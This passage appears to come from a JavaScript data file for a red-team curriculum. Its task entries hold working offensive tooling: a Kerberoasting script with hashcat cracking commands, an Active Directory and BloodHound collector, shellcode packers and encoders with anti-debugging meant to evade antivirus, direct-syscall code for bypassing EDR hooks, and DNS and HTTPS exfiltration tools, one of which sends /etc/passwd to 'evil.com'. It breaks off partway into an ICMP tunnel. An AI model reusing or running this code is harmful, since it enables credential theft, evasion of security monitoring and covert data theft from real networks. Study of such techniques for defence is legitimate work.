    kerbUsers, _ := enum.GetKerberoastableUsers()
    for _, u := range kerbUsers {
        fmt.Printf("%s - %s\\n", u["username"], u["spn"])
    }

    fmt.Println("\\n=== AS-REP Roastable Users ===")
    asrepUsers, _ := enum.GetASREPRoastableUsers()
    for _, u := range asrepUsers {
        fmt.Println(u)
    }
}
\`\`\``
				},
				{
					title: 'Build a Kerberoasting Tool',
					description: 'Request and extract service tickets for offline cracking',
					details: `## Kerberoasting Tool

### Attack Flow
1. Find users with SPNs
2. Request TGS tickets for their services
3. Extract ticket hashes
4. Crack offline with hashcat/john

### Python Implementation (using impacket)

\`\`\`python
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
from impacket.ldap import ldap
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
import datetime

class Kerberoaster:
    def __init__(self, domain, username, password, dc_ip):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip

    def get_tgt(self):
        """Get Ticket Granting Ticket."""
        client_principal = Principal(
            self.username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            client_principal,
            self.password,
            self.domain,
            None, None, None,
            self.dc_ip)

        return tgt, cipher, sessionKey

    def get_spn_users(self):
        """Find all users with SPNs via LDAP."""
        ldap_conn = ldap.LDAPConnection(
            f'ldap://{self.dc_ip}',
            self.domain.replace('.', ',DC='))

        ldap_conn.login(self.username, self.password, self.domain)

        search_filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
        attributes = ['sAMAccountName', 'servicePrincipalName']

        results = ldap_conn.search(
            searchFilter=search_filter,
            attributes=attributes)

        spn_users = []
        for entry in results:
            if isinstance(entry, ldap.SearchResultEntry):
                username = str(entry['attributes']['sAMAccountName'])
                spns = entry['attributes']['servicePrincipalName']
                if not isinstance(spns, list):
                    spns = [spns]
                spn_users.append({
                    'username': username,
                    'spns': [str(s) for s in spns]
                })

        return spn_users

    def request_tgs(self, spn, tgt, cipher, session_key):
        """Request TGS for a specific SPN."""
        server_principal = Principal(
            spn,
            type=constants.PrincipalNameType.NT_SRV_INST.value)

        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
            server_principal,
            self.domain,
            None,
            tgt, cipher, session_key)

        return tgs, cipher

    def tgs_to_hashcat(self, tgs, cipher, spn, username):
        """Convert TGS to hashcat format."""
        # Extract encrypted part
        enc_part = tgs['ticket']['enc-part']
        etype = enc_part['etype']
        cipher_text = enc_part['cipher']

        if etype == 23:  # RC4
            return f"$krb5tgs$23$*{username}\${self.domain}*\${spn}*\${cipher_text.hex()[:32]}\${cipher_text.hex()[32:]}"
        elif etype == 17:  # AES128
            return f"$krb5tgs$17\${self.domain}\${spn}*\${cipher_text.hex()}"
        elif etype == 18:  # AES256
            return f"$krb5tgs$18\${self.domain}\${spn}*\${cipher_text.hex()}"

    def run(self):
        """Execute Kerberoasting attack."""
        print(f"[*] Getting TGT for {self.username}@{self.domain}")
        tgt, cipher, session_key = self.get_tgt()

        print("[*] Finding users with SPNs...")
        spn_users = self.get_spn_users()
        print(f"[+] Found {len(spn_users)} users with SPNs")

        hashes = []
        for user in spn_users:
            username = user['username']
            spn = user['spns'][0]

            print(f"[*] Requesting TGS for {username} ({spn})")
            try:
                tgs, tgs_cipher = self.request_tgs(
                    spn, tgt, cipher, session_key)

                hash_str = self.tgs_to_hashcat(
                    tgs, tgs_cipher, spn, username)
                hashes.append(hash_str)
                print(f"[+] Got hash for {username}")
            except Exception as e:
                print(f"[-] Failed for {username}: {e}")

        return hashes

if __name__ == '__main__':
    roaster = Kerberoaster(
        domain='corp.local',
        username='user',
        password='password',
        dc_ip='192.168.1.10')

    hashes = roaster.run()

    print("\\n[*] Writing hashes to kerberoast.txt")
    with open('kerberoast.txt', 'w') as f:
        for h in hashes:
            f.write(h + '\\n')

    print("\\n[*] Crack with:")
    print("hashcat -m 13100 kerberoast.txt wordlist.txt")
\`\`\`

### Cracking Commands
\`\`\`bash
# RC4 tickets (mode 13100)
hashcat -m 13100 kerberoast.txt rockyou.txt

# AES256 tickets (mode 19700)
hashcat -m 19700 kerberoast.txt rockyou.txt

# With rules
hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule
\`\`\``
				},
				{
					title: 'Build a BloodHound Data Collector',
					description: 'Collect AD relationships for attack path analysis',
					details: `## BloodHound Data Collector

### What to Collect
- Users, groups, computers
- Group memberships
- Local admin rights
- Session data
- ACLs and delegations
- Trust relationships

### Go Implementation

\`\`\`go
package main

import (
    "encoding/json"
    "os"

    "github.com/go-ldap/ldap/v3"
)

type BloodHoundCollector struct {
    ldapConn *ldap.Conn
    domain   string
    baseDN   string
}

type Computer struct {
    Name          string            \`json:"name"\`
    ObjectID      string            \`json:"objectid"\`
    Properties    map[string]interface{} \`json:"properties"\`
    LocalAdmins   []Relationship    \`json:"localadmins"\`
    Sessions      []Session         \`json:"sessions"\`
    Aces          []ACE             \`json:"aces"\`
}

type User struct {
    Name       string            \`json:"name"\`
    ObjectID   string            \`json:"objectid"\`
    Properties map[string]interface{} \`json:"properties"\`
    MemberOf   []string          \`json:"memberof"\`
    Aces       []ACE             \`json:"aces"\`
}

type Group struct {
    Name     string   \`json:"name"\`
    ObjectID string   \`json:"objectid"\`
    Members  []string \`json:"members"\`
    Aces     []ACE    \`json:"aces"\`
}

type Relationship struct {
    MemberName string \`json:"MemberName"\`
    MemberType string \`json:"MemberType"\`
}

type Session struct {
    UserName     string \`json:"UserName"\`
    ComputerName string \`json:"ComputerName"\`
}

type ACE struct {
    PrincipalName string \`json:"PrincipalName"\`
    PrincipalType string \`json:"PrincipalType"\`
    RightName     string \`json:"RightName"\`
    IsInherited   bool   \`json:"IsInherited"\`
}

func (c *BloodHoundCollector) CollectUsers() ([]User, error) {
    searchRequest := ldap.NewSearchRequest(
        c.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(&(objectCategory=person)(objectClass=user))",
        []string{
            "sAMAccountName", "objectSid", "memberOf",
            "pwdLastSet", "lastLogon", "userAccountControl",
            "adminCount", "servicePrincipalName",
        },
        nil,
    )

    result, err := c.ldapConn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    users := []User{}
    for _, entry := range result.Entries {
        sid := decodeSID(entry.GetRawAttributeValue("objectSid"))

        user := User{
            Name:     entry.GetAttributeValue("sAMAccountName") + "@" + c.domain,
            ObjectID: sid,
            Properties: map[string]interface{}{
                "enabled":      isEnabled(entry.GetAttributeValue("userAccountControl")),
                "pwdlastset":   entry.GetAttributeValue("pwdLastSet"),
                "lastlogon":    entry.GetAttributeValue("lastLogon"),
                "admincount":   entry.GetAttributeValue("adminCount") == "1",
                "hasspn":       len(entry.GetAttributeValues("servicePrincipalName")) > 0,
            },
            MemberOf: entry.GetAttributeValues("memberOf"),
        }
        users = append(users, user)
    }

    return users, nil
}

func (c *BloodHoundCollector) CollectGroups() ([]Group, error) {
    searchRequest := ldap.NewSearchRequest(
        c.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(objectCategory=group)",
        []string{"sAMAccountName", "objectSid", "member"},
        nil,
    )

    result, err := c.ldapConn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    groups := []Group{}
    for _, entry := range result.Entries {
        sid := decodeSID(entry.GetRawAttributeValue("objectSid"))

        group := Group{
            Name:     entry.GetAttributeValue("sAMAccountName") + "@" + c.domain,
            ObjectID: sid,
            Members:  entry.GetAttributeValues("member"),
        }
        groups = append(groups, group)
    }

    return groups, nil
}

func (c *BloodHoundCollector) CollectComputers() ([]Computer, error) {
    searchRequest := ldap.NewSearchRequest(
        c.baseDN,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(objectCategory=computer)",
        []string{
            "sAMAccountName", "objectSid", "operatingSystem",
            "operatingSystemVersion", "dNSHostName",
        },
        nil,
    )

    result, err := c.ldapConn.Search(searchRequest)
    if err != nil {
        return nil, err
    }

    computers := []Computer{}
    for _, entry := range result.Entries {
        sid := decodeSID(entry.GetRawAttributeValue("objectSid"))

        computer := Computer{
            Name:     entry.GetAttributeValue("dNSHostName"),
            ObjectID: sid,
            Properties: map[string]interface{}{
                "operatingsystem": entry.GetAttributeValue("operatingSystem"),
                "osversion":       entry.GetAttributeValue("operatingSystemVersion"),
            },
        }
        computers = append(computers, computer)
    }

    return computers, nil
}

func (c *BloodHoundCollector) ExportJSON(outputDir string) error {
    users, _ := c.CollectUsers()
    groups, _ := c.CollectGroups()
    computers, _ := c.CollectComputers()

    // Write users
    usersFile, _ := os.Create(outputDir + "/users.json")
    json.NewEncoder(usersFile).Encode(map[string]interface{}{
        "data": users,
        "meta": map[string]interface{}{
            "methods": 0,
            "type":    "users",
            "count":   len(users),
            "version": 4,
        },
    })
    usersFile.Close()

    // Write groups
    groupsFile, _ := os.Create(outputDir + "/groups.json")
    json.NewEncoder(groupsFile).Encode(map[string]interface{}{
        "data": groups,
        "meta": map[string]interface{}{
            "methods": 0,
            "type":    "groups",
            "count":   len(groups),
            "version": 4,
        },
    })
    groupsFile.Close()

    // Write computers
    computersFile, _ := os.Create(outputDir + "/computers.json")
    json.NewEncoder(computersFile).Encode(map[string]interface{}{
        "data": computers,
        "meta": map[string]interface{}{
            "methods": 0,
            "type":    "computers",
            "count":   len(computers),
            "version": 4,
        },
    })
    computersFile.Close()

    return nil
}
\`\`\`

### Usage
\`\`\`bash
# Run collector
./bloodhound-collector -d corp.local -u user -p pass -dc dc01.corp.local -o ./output

# Import into BloodHound
# Upload JSON files via BloodHound UI
\`\`\``
				}
			]
		},
		{
			name: 'Evasion & Defense Bypass',
			description: 'Techniques for avoiding detection by security controls',
			tasks: [
				{
					title: 'Build a Binary Packer/Crypter',
					description: 'Obfuscate binaries to evade AV detection',
					details: `## Binary Packer in Go

### Techniques
- XOR/AES encryption of payload
- Runtime unpacking
- Anti-analysis tricks
- String obfuscation

### Simple XOR Packer

\`\`\`go
package main

import (
    "crypto/rand"
    "fmt"
    "os"
)

func xorEncrypt(data, key []byte) []byte {
    result := make([]byte, len(data))
    for i := range data {
        result[i] = data[i] ^ key[i%len(key)]
    }
    return result
}

func generateKey(length int) []byte {
    key := make([]byte, length)
    rand.Read(key)
    return key
}

func main() {
    // Read payload
    payload, err := os.ReadFile("payload.exe")
    if err != nil {
        panic(err)
    }

    // Generate key
    key := generateKey(32)

    // Encrypt
    encrypted := xorEncrypt(payload, key)

    // Generate loader stub
    stub := generateStub(key, encrypted)

    os.WriteFile("packed.go", stub, 0644)
}

func generateStub(key, encrypted []byte) []byte {
    template := \`package main

import (
    "syscall"
    "unsafe"
)

var key = []byte{%s}
var payload = []byte{%s}

func xorDecrypt(data, key []byte) []byte {
    result := make([]byte, len(data))
    for i := range data {
        result[i] = data[i] ^ key[i%%len(key)]
    }
    return result
}

func main() {
    decrypted := xorDecrypt(payload, key)

    // Allocate executable memory
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")

    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(decrypted)),
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    )

    // Copy and execute
    copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], decrypted)
    syscall.Syscall(addr, 0, 0, 0, 0)
}
\`

    return []byte(fmt.Sprintf(template,
        formatBytes(key),
        formatBytes(encrypted)))
}

func formatBytes(data []byte) string {
    result := ""
    for i, b := range data {
        if i > 0 {
            result += ", "
        }
        result += fmt.Sprintf("0x%02x", b)
    }
    return result
}
\`\`\`

### AES Packer with Anti-Debug

\`\`\`go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "syscall"
    "time"
    "unsafe"
)

var (
    key = []byte{/* AES key */}
    iv  = []byte{/* IV */}
    enc = []byte{/* Encrypted payload */}
)

func antiDebug() bool {
    // Check IsDebuggerPresent
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    isDebugger := kernel32.NewProc("IsDebuggerPresent")
    ret, _, _ := isDebugger.Call()
    if ret != 0 {
        return true
    }

    // Timing check
    start := time.Now()
    time.Sleep(100 * time.Millisecond)
    if time.Since(start) > 500*time.Millisecond {
        return true // Likely being debugged/sandboxed
    }

    return false
}

func decrypt() []byte {
    block, _ := aes.NewCipher(key)
    stream := cipher.NewCFBDecrypter(block, iv)
    decrypted := make([]byte, len(enc))
    stream.XORKeyStream(decrypted, enc)
    return decrypted
}

func execute(shellcode []byte) {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        0x3000,
        0x40)

    rtlMoveMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)))

    syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
    if antiDebug() {
        // Behave normally or exit
        return
    }

    shellcode := decrypt()
    execute(shellcode)
}
\`\`\`

### Build with garble
\`\`\`bash
# Install garble
go install mvdan.cc/garble@latest

# Build obfuscated binary
garble -literals -tiny build -o packed.exe
\`\`\``
				},
				{
					title: 'Build a Shellcode Encoder',
					description: 'XOR, AES, and custom encoding schemes for shellcode',
					details: `## Shellcode Encoder

### Encoding Techniques
- XOR with single/multi-byte key
- AES encryption
- Custom alphabet encoding
- Polymorphic encoding

### Multi-layer Encoder

\`\`\`go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
)

type Encoder struct {
    shellcode []byte
}

func NewEncoder(shellcode []byte) *Encoder {
    return &Encoder{shellcode: shellcode}
}

// XOR encoding with random key
func (e *Encoder) XOREncode() ([]byte, []byte) {
    key := make([]byte, 16)
    rand.Read(key)

    encoded := make([]byte, len(e.shellcode))
    for i := range e.shellcode {
        encoded[i] = e.shellcode[i] ^ key[i%len(key)]
    }

    return encoded, key
}

// AES encryption
func (e *Encoder) AESEncode() ([]byte, []byte, []byte) {
    key := make([]byte, 32) // AES-256
    rand.Read(key)

    iv := make([]byte, aes.BlockSize)
    rand.Read(iv)

    block, _ := aes.NewCipher(key)
    stream := cipher.NewCFBEncrypter(block, iv)

    encoded := make([]byte, len(e.shellcode))
    stream.XORKeyStream(encoded, e.shellcode)

    return encoded, key, iv
}

// UUID encoding (encode as array of UUIDs)
func (e *Encoder) UUIDEncode() []string {
    // Pad to multiple of 16
    padded := e.shellcode
    if len(padded)%16 != 0 {
        padding := 16 - (len(padded) % 16)
        padded = append(padded, make([]byte, padding)...)
    }

    uuids := []string{}
    for i := 0; i < len(padded); i += 16 {
        chunk := padded[i : i+16]
        uuid := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
            chunk[0:4],
            chunk[4:6],
            chunk[6:8],
            chunk[8:10],
            chunk[10:16])
        uuids = append(uuids, uuid)
    }

    return uuids
}

// IPv4 encoding (encode as IP addresses)
func (e *Encoder) IPv4Encode() []string {
    // Pad to multiple of 4
    padded := e.shellcode
    if len(padded)%4 != 0 {
        padding := 4 - (len(padded) % 4)
        padded = append(padded, make([]byte, padding)...)
    }

    ips := []string{}
    for i := 0; i < len(padded); i += 4 {
        ip := fmt.Sprintf("%d.%d.%d.%d",
            padded[i], padded[i+1], padded[i+2], padded[i+3])
        ips = append(ips, ip)
    }

    return ips
}

// Generate decoder stub
func GenerateXORDecoder(encoded, key []byte) string {
    return fmt.Sprintf(\`
var key = []byte{%s}
var shellcode = []byte{%s}

func decode() []byte {
    decoded := make([]byte, len(shellcode))
    for i := range shellcode {
        decoded[i] = shellcode[i] ^ key[i%%len(key)]
    }
    return decoded
}
\`, formatBytes(key), formatBytes(encoded))
}

func GenerateUUIDDecoder(uuids []string) string {
    uuidStr := ""
    for i, uuid := range uuids {
        if i > 0 {
            uuidStr += ", "
        }
        uuidStr += fmt.Sprintf(\`"%s"\`, uuid)
    }

    return fmt.Sprintf(\`
import "encoding/hex"

var uuids = []string{%s}

func decode() []byte {
    result := []byte{}
    for _, uuid := range uuids {
        clean := strings.ReplaceAll(uuid, "-", "")
        chunk, _ := hex.DecodeString(clean)
        result = append(result, chunk...)
    }
    return result
}
\`, uuidStr)
}

func formatBytes(data []byte) string {
    result := ""
    for i, b := range data {
        if i > 0 {
            result += ", "
        }
        result += fmt.Sprintf("0x%02x", b)
    }
    return result
}

func main() {
    // Example shellcode (calc.exe launcher)
    shellcode := []byte{0xfc, 0x48, 0x83, /* ... */}

    encoder := NewEncoder(shellcode)

    // XOR encode
    xorEncoded, xorKey := encoder.XOREncode()
    fmt.Println("XOR Decoder:")
    fmt.Println(GenerateXORDecoder(xorEncoded, xorKey))

    // UUID encode
    uuids := encoder.UUIDEncode()
    fmt.Println("\\nUUID Decoder:")
    fmt.Println(GenerateUUIDDecoder(uuids))

    // IPv4 encode
    ips := encoder.IPv4Encode()
    fmt.Printf("\\nIPv4 encoded: %v\\n", ips[:5])
}
\`\`\`

### Decoder Patterns
- **Stack-based** - Push encoded bytes, decode in place
- **Heap-based** - Allocate, decode, execute
- **Register-only** - No memory allocation (harder to detect)`
				},
				{
					title: 'Build a Direct Syscall Wrapper',
					description: 'Bypass EDR hooks by calling syscalls directly',
					details: `## Direct Syscalls in Go

### Why Direct Syscalls?
- EDR/AV hooks ntdll.dll functions
- Direct syscalls bypass userland hooks
- Requires knowing syscall numbers

### Syscall Number Extraction

\`\`\`go
package main

import (
    "debug/pe"
    "encoding/binary"
    "fmt"
    "os"
    "sort"
)

type Syscall struct {
    Name   string
    Number uint16
}

func extractSyscalls() ([]Syscall, error) {
    // Read ntdll.dll
    f, err := pe.Open("C:\\\\Windows\\\\System32\\\\ntdll.dll")
    if err != nil {
        return nil, err
    }
    defer f.Close()

    // Find export directory
    exports, err := f.Exports()
    if err != nil {
        return nil, err
    }

    // Read .text section
    var textSection *pe.Section
    for _, section := range f.Sections {
        if section.Name == ".text" {
            textSection = section
            break
        }
    }

    textData, _ := textSection.Data()

    syscalls := []Syscall{}

    for _, exp := range exports {
        // Only Nt* functions have syscalls
        if len(exp.Name) < 2 || exp.Name[:2] != "Nt" {
            continue
        }

        // Calculate offset in .text
        rva := exp.VirtualAddress - textSection.VirtualAddress

        if rva >= uint32(len(textData))-20 {
            continue
        }

        // Look for syscall pattern:
        // mov r10, rcx (4C 8B D1)
        // mov eax, <syscall_number> (B8 XX XX 00 00)
        code := textData[rva : rva+20]

        if code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 &&
            code[3] == 0xB8 {
            number := binary.LittleEndian.Uint16(code[4:6])
            syscalls = append(syscalls, Syscall{
                Name:   exp.Name,
                Number: number,
            })
        }
    }

    sort.Slice(syscalls, func(i, j int) bool {
        return syscalls[i].Number < syscalls[j].Number
    })

    return syscalls, nil
}
\`\`\`

### Direct Syscall Implementation

\`\`\`go
// +build windows

package main

import (
    "unsafe"
)

// Syscall numbers (Windows 10 21H2)
const (
    NtAllocateVirtualMemory = 0x0018
    NtWriteVirtualMemory    = 0x003A
    NtCreateThreadEx        = 0x00C1
    NtProtectVirtualMemory  = 0x0050
)

//go:nosplit
func syscall(number uintptr, args ...uintptr) uintptr

// Assembly implementation (needs separate .s file)
// TEXT ·syscall(SB), NOSPLIT, $0
//     MOVQ number+0(FP), AX
//     MOVQ args+8(FP), SI
//     MOVQ 0(SI), CX
//     MOVQ 8(SI), DX
//     MOVQ 16(SI), R8
//     MOVQ 24(SI), R9
//     MOVQ $0, R10
//     MOVQ CX, R10
//     SYSCALL
//     RET

func NtAllocateVirtualMemoryDirect(
    processHandle uintptr,
    baseAddress *uintptr,
    zeroBits uintptr,
    regionSize *uintptr,
    allocationType uint32,
    protect uint32,
) uintptr {
    return syscall(
        NtAllocateVirtualMemory,
        processHandle,
        uintptr(unsafe.Pointer(baseAddress)),
        zeroBits,
        uintptr(unsafe.Pointer(regionSize)),
        uintptr(allocationType),
        uintptr(protect),
    )
}

func executeShellcode(shellcode []byte) {
    var baseAddr uintptr
    regionSize := uintptr(len(shellcode))

    // Allocate memory
    NtAllocateVirtualMemoryDirect(
        ^uintptr(0), // Current process
        &baseAddr,
        0,
        &regionSize,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE
    )

    // Copy shellcode
    // ... (use NtWriteVirtualMemory or direct copy)

    // Change protection
    var oldProtect uint32
    NtProtectVirtualMemoryDirect(
        ^uintptr(0),
        &baseAddr,
        &regionSize,
        0x20, // PAGE_EXECUTE_READ
        &oldProtect,
    )

    // Create thread
    // ...
}
\`\`\`

### Hell's Gate / Halo's Gate
\`\`\`go
// Dynamic syscall number resolution
// Read syscall numbers at runtime from ntdll.dll
// Bypasses static signature detection
\`\`\``
				}
			]
		},
		{
			name: 'Exfiltration',
			description: 'Tools for covert data extraction from compromised systems',
			tasks: [
				{
					title: 'Build a DNS Exfiltration Tool',
					description: 'Encode and exfiltrate data through DNS queries',
					details: `## DNS Exfiltration

### Why DNS?
- Usually allowed through firewalls
- Blends with normal traffic
- Multiple record types available

### Implementation

\`\`\`go
package main

import (
    "encoding/base32"
    "fmt"
    "os"
    "strings"
    "time"

    "github.com/miekg/dns"
)

type DNSExfil struct {
    domain   string
    resolver string
    chunkSize int
}

func NewDNSExfil(domain, resolver string) *DNSExfil {
    return &DNSExfil{
        domain:    domain,
        resolver:  resolver,
        chunkSize: 63, // Max subdomain label length
    }
}

func (d *DNSExfil) encodeChunk(data []byte) string {
    // Base32 encode (DNS-safe characters)
    encoded := base32.StdEncoding.EncodeToString(data)
    // Remove padding
    encoded = strings.TrimRight(encoded, "=")
    return strings.ToLower(encoded)
}

func (d *DNSExfil) ExfiltrateFile(filepath string) error {
    data, err := os.ReadFile(filepath)
    if err != nil {
        return err
    }

    // Generate session ID
    sessionID := fmt.Sprintf("%d", time.Now().UnixNano()%100000)

    // Split into chunks
    chunks := d.splitData(data)
    totalChunks := len(chunks)

    fmt.Printf("[*] Exfiltrating %s (%d bytes, %d chunks)\\n",
        filepath, len(data), totalChunks)

    for i, chunk := range chunks {
        encoded := d.encodeChunk(chunk)

        // Query format: <data>.<chunk>.<total>.<session>.data.<domain>
        query := fmt.Sprintf("%s.%d.%d.%s.data.%s",
            encoded, i, totalChunks, sessionID, d.domain)

        err := d.sendQuery(query)
        if err != nil {
            fmt.Printf("[-] Chunk %d failed: %v\\n", i, err)
            continue
        }

        fmt.Printf("[+] Sent chunk %d/%d\\n", i+1, totalChunks)

        // Rate limit to avoid detection
        time.Sleep(100 * time.Millisecond)
    }

    // Send completion marker
    d.sendQuery(fmt.Sprintf("done.%s.data.%s", sessionID, d.domain))

    return nil
}

func (d *DNSExfil) splitData(data []byte) [][]byte {
    // Calculate max chunk size after encoding
    // Base32 expands by 8/5, so reverse calculate
    rawChunkSize := (d.chunkSize * 5) / 8

    chunks := [][]byte{}
    for i := 0; i < len(data); i += rawChunkSize {
        end := i + rawChunkSize
        if end > len(data) {
            end = len(data)
        }
        chunks = append(chunks, data[i:end])
    }
    return chunks
}

func (d *DNSExfil) sendQuery(query string) error {
    c := &dns.Client{
        Timeout: 5 * time.Second,
    }

    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(query), dns.TypeA)

    _, _, err := c.Exchange(m, d.resolver)
    return err
}

func main() {
    exfil := NewDNSExfil("evil.com", "8.8.8.8:53")

    // Exfiltrate a file
    exfil.ExfiltrateFile("/etc/passwd")
}
\`\`\`

### Receiver Server

\`\`\`go
func (s *DNSServer) handleExfilQuery(name string) {
    // Parse: <data>.<chunk>.<total>.<session>.data.<domain>
    parts := strings.Split(name, ".")

    if len(parts) < 6 {
        return
    }

    data := parts[0]
    chunkNum, _ := strconv.Atoi(parts[1])
    totalChunks, _ := strconv.Atoi(parts[2])
    sessionID := parts[3]

    // Decode data
    decoded, _ := base32.StdEncoding.DecodeString(
        strings.ToUpper(data) + "======")

    // Store chunk
    s.mu.Lock()
    if s.sessions[sessionID] == nil {
        s.sessions[sessionID] = make(map[int][]byte)
    }
    s.sessions[sessionID][chunkNum] = decoded

    // Check if complete
    if len(s.sessions[sessionID]) == totalChunks {
        s.reassemble(sessionID, totalChunks)
    }
    s.mu.Unlock()
}

func (s *DNSServer) reassemble(sessionID string, totalChunks int) {
    data := []byte{}
    for i := 0; i < totalChunks; i++ {
        data = append(data, s.sessions[sessionID][i]...)
    }

    filename := fmt.Sprintf("exfil_%s.bin", sessionID)
    os.WriteFile(filename, data, 0644)
    fmt.Printf("[+] Saved exfiltrated data to %s\\n", filename)
}
\`\`\`

### Alternative DNS Record Types
- TXT records (larger payload per query)
- NULL records
- MX records
- CNAME chains`
				},
				{
					title: 'Build an HTTPS Exfiltration Tool',
					description: 'Covert data transfer over HTTPS with steganography',
					details: `## HTTPS Exfiltration

### Techniques
- POST to legitimate-looking endpoint
- Hidden in image steganography
- Chunked transfer encoding
- Domain fronting

### Basic HTTPS Exfil

\`\`\`go
package main

import (
    "bytes"
    "compress/gzip"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io"
    "mime/multipart"
    "net/http"
    "os"
    "path/filepath"
)

type HTTPSExfil struct {
    endpoint string
    aesKey   []byte
}

func NewHTTPSExfil(endpoint string, key []byte) *HTTPSExfil {
    return &HTTPSExfil{
        endpoint: endpoint,
        aesKey:   key,
    }
}

func (e *HTTPSExfil) compress(data []byte) []byte {
    var buf bytes.Buffer
    w := gzip.NewWriter(&buf)
    w.Write(data)
    w.Close()
    return buf.Bytes()
}

func (e *HTTPSExfil) encrypt(data []byte) ([]byte, error) {
    block, err := aes.NewCipher(e.aesKey)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)

    return gcm.Seal(nonce, nonce, data, nil), nil
}

func (e *HTTPSExfil) ExfiltrateFile(filepath string) error {
    data, err := os.ReadFile(filepath)
    if err != nil {
        return err
    }

    // Compress
    compressed := e.compress(data)

    // Encrypt
    encrypted, err := e.encrypt(compressed)
    if err != nil {
        return err
    }

    // Send as file upload (looks normal)
    return e.sendAsUpload(encrypted, filepath)
}

func (e *HTTPSExfil) sendAsUpload(data []byte, filename string) error {
    var buf bytes.Buffer
    writer := multipart.NewWriter(&buf)

    // Create form file
    part, _ := writer.CreateFormFile("file",
        filepath.Base(filename)+".log")
    part.Write(data)

    // Add decoy fields
    writer.WriteField("type", "diagnostic")
    writer.WriteField("version", "1.0")

    writer.Close()

    req, _ := http.NewRequest("POST", e.endpoint, &buf)
    req.Header.Set("Content-Type", writer.FormDataContentType())
    req.Header.Set("User-Agent",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != 200 {
        return fmt.Errorf("upload failed: %d", resp.StatusCode)
    }

    return nil
}

func (e *HTTPSExfil) sendAsJSON(data []byte) error {
    // Disguise as analytics event
    encoded := base64.StdEncoding.EncodeToString(data)

    payload := fmt.Sprintf(\`{
        "event": "page_view",
        "timestamp": %d,
        "data": "%s",
        "user_agent": "Mozilla/5.0"
    }\`, time.Now().Unix(), encoded)

    req, _ := http.NewRequest("POST", e.endpoint+"/analytics",
        bytes.NewReader([]byte(payload)))
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    resp.Body.Close()

    return nil
}
\`\`\`

### Image Steganography

\`\`\`go
import "image"
import "image/png"

func hideInImage(coverPath string, data []byte) ([]byte, error) {
    // Open cover image
    f, _ := os.Open(coverPath)
    img, _ := png.Decode(f)
    f.Close()

    bounds := img.Bounds()
    rgba := image.NewRGBA(bounds)

    // Copy image
    draw.Draw(rgba, bounds, img, image.Point{}, draw.Src)

    // Embed data in LSB
    dataIdx := 0
    bitIdx := 0

    for y := bounds.Min.Y; y < bounds.Max.Y && dataIdx < len(data); y++ {
        for x := bounds.Min.X; x < bounds.Max.X && dataIdx < len(data); x++ {
            r, g, b, a := rgba.At(x, y).RGBA()

            // Embed one bit in blue channel LSB
            bit := (data[dataIdx] >> (7 - bitIdx)) & 1
            b = (b & 0xFFFE) | uint32(bit)

            rgba.SetRGBA(x, y, color.RGBA{
                uint8(r >> 8),
                uint8(g >> 8),
                uint8(b >> 8),
                uint8(a >> 8),
            })

            bitIdx++
            if bitIdx == 8 {
                bitIdx = 0
                dataIdx++
            }
        }
    }

    var buf bytes.Buffer
    png.Encode(&buf, rgba)
    return buf.Bytes(), nil
}
\`\`\`

### Domain Fronting
\`\`\`go
func domainFrontedRequest(hiddenHost, frontDomain string, data []byte) error {
    req, _ := http.NewRequest("POST",
        "https://"+frontDomain+"/upload",
        bytes.NewReader(data))

    // Actual destination in Host header
    req.Host = hiddenHost

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    resp.Body.Close()

    return nil
}
\`\`\``
				},
				{
					title: 'Build an ICMP Tunnel',
					description: 'Data exfiltration over ICMP ping packets',
					details: `## ICMP Tunnel

### Why ICMP?
- Often allowed when other protocols blocked
- Can tunnel any protocol
- Less commonly monitored

### Implementation

\`\`\`go
package main

import (
    "encoding/binary"
    "fmt"
    "net"
    "os"
    "time"

    "golang.org/x/net/icmp"
    "golang.org/x/net/ipv4"
)

const (
    MaxDataSize = 1400 // Leave room for headers
)

